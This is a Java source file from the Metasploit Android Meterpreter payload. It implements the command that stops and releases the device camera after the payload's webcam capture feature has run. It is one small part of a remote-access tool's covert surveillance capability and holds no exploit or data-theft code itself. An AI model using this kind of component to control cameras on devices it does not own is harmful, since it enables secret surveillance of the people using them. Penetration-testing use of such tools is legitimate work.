
package com.metasploit.meterpreter.android;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;
import com.metasploit.meterpreter.stdapi.webcam_audio_record;

import android.util.Log;

public class webcam_stop_android extends webcam_audio_record implements Command {

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {

        try {
            if (webcam_start_android.camera != null) {
                webcam_start_android.camera.stopPreview();
                webcam_start_android.camera.release();
                webcam_start_android.camera = null;
            }

        } catch (Exception e) {
            Log.e(getClass().getSimpleName(), "webcam error ", e);
        }

        return ERROR_SUCCESS;
    }
}
